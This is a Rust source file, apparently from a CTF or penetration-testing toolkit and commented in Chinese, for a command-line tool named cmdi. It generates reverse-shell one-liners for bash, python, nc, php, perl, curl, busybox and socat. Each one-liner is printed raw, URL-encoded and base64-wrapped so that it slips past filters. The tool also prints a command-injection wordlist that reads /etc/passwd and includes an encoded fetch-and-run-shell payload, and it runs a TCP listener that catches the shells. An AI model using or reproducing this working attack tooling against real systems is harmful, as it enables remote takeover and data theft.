//! cmdi - 命令注入 payload 生成 + 反弹 shell + TCP 监听

use base64::Engine;
use clap::{Args as ClapArgs, CommandFactory, Parser, Subcommand};
use common::{exit, finish, Mode, Out};
use percent_encoding::{utf8_percent_encode, AsciiSet, NON_ALPHANUMERIC};
use serde::Serialize;
use std::io::{self, BufRead, ErrorKind, Read, Write};
use std::net::TcpListener;
use std::process::ExitCode;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;

const QUOTE_SET: &AsciiSet = &NON_ALPHANUMERIC
    .remove(b'_')
    .remove(b'.')
    .remove(b'-')
    .remove(b'~');

const PAYLOADS: [&str; 32] = [
    "# 命令注入 wordlist",
    "id",
    "whoami",
    "ls",
    "ls -la",
    "pwd",
    "uname -a",
    "cat /etc/passwd",
    "cat /flag",
    "cat /flag.txt",
    "cat /flag/flag",
    "find / -name \"*flag*\" 2>/dev/null",
    "env",
    "printenv",
    "echo `id`",
    "$(id)",
    ";id",
    "|id",
    "||id",
    "&&id",
    "`id`",
    "$(cat /etc/passwd)",
    ";ls -la /tmp",
    "|cat /etc/passwd",
    "||cat /etc/passwd",
    "&&cat /etc/passwd",
    "%0aid",
    "%0aid%0a",
    "%24(id)",
    "'id'",
    "\"id\"",
    ";echo Y3VybCBodHRwOi8vWFgvc2hlbGwuc2h8YmFzaA==|base64 -d|bash",
];

#[derive(Parser, Debug)]
#[command(
    name = "cmdi",
    version,
    about = "命令注入 payload 生成 + 反弹 shell",
    long_about = "cmdi -- 命令注入 payload 生成 + 反弹 shell\n\n用法:\n  cmdi revshell <bash|python3|nc|php|perl|curl|busybox|socat> <LHOST> <LPORT>\n        生成反弹 shell 命令(原样 + URL 编码两份)\n  cmdi payloads\n        打印常用命令注入 wordlist\n  cmdi listen <PORT>\n        TCP 监听器(纯 stdlib), 反弹 shell 的收听后端\n\n例子:\n  cmdi revshell bash 10.0.0.1 4444\n  cmdi listen 4444",
    after_help = "退出码: 0=命中 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    #[command(subcommand)]
    cmd: Cmd,

    /// JSON 输出
    #[arg(long, global = true)]
    json: bool,
}

#[derive(Subcommand, Debug)]
enum Cmd {
    /// 生成反弹 shell 命令
    Revshell(RevshellArgs),
    /// 打印命令注入 wordlist
    Payloads,
    /// TCP 监听器
    Listen(ListenArgs),
}

#[derive(ClapArgs, Debug)]
struct RevshellArgs {
    /// 类型: bash|python3|nc|php|perl|curl|busybox|socat
    #[arg(value_name = "TYPE")]
    shell: String,

    /// 监听主机
    #[arg(value_name = "LHOST")]
    lhost: String,

    /// 监听端口
    #[arg(value_name = "LPORT")]
    lport: String,
}

#[derive(ClapArgs, Debug)]
struct ListenArgs {
    /// 监听端口
    #[arg(value_name = "PORT", default_value_t = 4444)]
    port: u16,
}

#[derive(Serialize)]
struct RevshellReport {
    shell: String,
    lhost: String,
    lport: String,
    raw: String,
    url_encoded: String,
    base64: String,
    base64_command: String,
}

#[derive(Serialize)]
struct PayloadsReport {
    #[serde(skip_serializing_if = "Option::is_none")]
    comment: Option<String>,
    count: usize,
    payloads: Vec<String>,
}

fn quote(s: &str) -> String {
    utf8_percent_encode(s, QUOTE_SET).to_string()
}

fn build_revshell(shell: &str, lhost: &str, lport: &str) -> Option<String> {
    Some(match shell {
        "bash" => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        "python3" => format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#
        ),
        "nc" => format!("nc {lhost} {lport} -e /bin/bash"),
        "php" => format!(
            r#"php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"#
        ),
        "perl" => format!(
            r#"perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"#
        ),
        "curl" => format!("curl http://{lhost}:{lport}/shell.sh|bash"),
        "busybox" => format!("busybox nc {lhost} {lport} -e /bin/sh"),
        "socat" => format!("socat TCP:{lhost}:{lport} EXEC:/bin/bash"),
        _ => return None,
    })
}

fn revshell(out: &Out, a: &RevshellArgs) -> ExitCode {
    let Some(raw) = build_revshell(&a.shell, &a.lhost, &a.lport) else {
        eprintln!("未知类型: {}", a.shell);
        let _ = Args::command().print_help();
        return finish(exit::USAGE);
    };
    let url_encoded = quote(&raw);
    let b64 = base64::engine::general_purpose::STANDARD.encode(raw.as_bytes());
    let base64_command = format!("echo {b64} | base64 -d | bash");
    let report = RevshellReport {
        shell: a.shell.clone(),
        lhost: a.lhost.clone(),
        lport: a.lport.clone(),
        raw: raw.clone(),
        url_encoded: url_encoded.clone(),
        base64: b64.clone(),
        base64_command: base64_command.clone(),
    };
    out.emit(
        || {
            println!("=== 原样 ===");
            println!("{raw}");
            println!();
            println!("=== URL 编码(直接放 GET 参数) ===");
            println!("{url_encoded}");
            println!();
            println!("=== base64(先编码再解码执行, 规避过滤) ===");
            println!("{base64_command}");
        },
        &report,
    );
    finish(exit::OK)
}

fn payloads(out: &Out) {
    let report = PayloadsReport {
        comment: Some(PAYLOADS[0].to_string()),
        count: PAYLOADS.len() - 1,
        payloads: PAYLOADS[1..].iter().map(|s| s.to_string()).collect(),
    };
    out.emit(
        || {
            for line in PAYLOADS {
                println!("{line}");
            }
        },
        &report,
    );
}

fn emit_line(out: &Out, peer: &str, ip: &str, line: &[u8]) {
    let text = String::from_utf8_lossy(line).to_string();
    if out.json() {
        println!(
            "{}",
            serde_json::json!({"event": "data", "peer": peer, "data": text})
        );
    } else {
        println!("  {ip}: {text}");
    }
}

fn listen(port: u16, out: &Out) -> Result<(), String> {
    let listener = TcpListener::bind(("0.0.0.0", port)).map_err(|e| format!("监听失败: {e}"))?;
    if out.json() {
        println!(
            "{}",
            serde_json::json!({"event": "listening", "addr": format!("0.0.0.0:{port}")})
        );
    } else {
        println!("[*] 监听 0.0.0.0:{port}, Ctrl-C 退出");
    }

    let (tx, rx) = mpsc::channel::<String>();
    thread::spawn(move || {
        let stdin = io::stdin();
        for line in stdin.lock().lines() {
            match line {
                Ok(l) => {
                    if tx.send(l).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    for conn in listener.incoming() {
        let mut stream = match conn {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[-] accept: {e}");
                continue;
            }
        };
        let peer = stream
            .peer_addr()
            .map(|a| a.to_string())
            .unwrap_or_default();
        let ip = stream
            .peer_addr()
            .map(|a| a.ip().to_string())
            .unwrap_or_default();
        if out.json() {
            println!(
                "{}",
                serde_json::json!({"event": "connected", "peer": peer})
            );
        } else {
            println!("[+] 连接来自 {peer}");
        }
        let _ = stream.set_read_timeout(Some(Duration::from_millis(200)));
        let mut buf: Vec<u8> = Vec::new();
        loop {
            while let Ok(line) = rx.try_recv() {
                let _ = stream.write_all(line.as_bytes());
                let _ = stream.write_all(b"\n");
            }
            let mut chunk = [0u8; 4096];
            match stream.read(&mut chunk) {
                Ok(0) => break,
                Ok(n) => {
                    buf.extend_from_slice(&chunk[..n]);
                    while let Some(pos) = buf.iter().position(|&b| b == b'\n' || b == b'\r') {
                        let line: Vec<u8> = buf.drain(..=pos).collect();
                        emit_line(out, &peer, &ip, &line[..line.len() - 1]);
                    }
                }
                Err(e) if matches!(e.kind(), ErrorKind::WouldBlock | ErrorKind::TimedOut) => {
                    if !buf.is_empty() {
                        emit_line(out, &peer, &ip, &buf);
                        buf.clear();
                    }
                }
                Err(e) => {
                    if out.json() {
                        println!(
                            "{}",
                            serde_json::json!({"event": "error", "peer": peer, "error": e.to_string()})
                        );
                    } else {
                        println!("[-] 会话结束: {e}");
                    }
                    break;
                }
            }
        }
        if out.json() {
            println!(
                "{}",
                serde_json::json!({"event": "disconnected", "peer": peer})
            );
        }
    }
    Ok(())
}

fn main() -> ExitCode {
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));
    match &args.cmd {
        Cmd::Revshell(a) => revshell(&out, a),
        Cmd::Payloads => {
            payloads(&out);
            finish(exit::OK)
        }
        Cmd::Listen(a) => match listen(a.port, &out) {
            Ok(()) => finish(exit::OK),
            Err(e) => {
                out.error(&e);
                finish(exit::ERROR)
            }
        },
    }
}
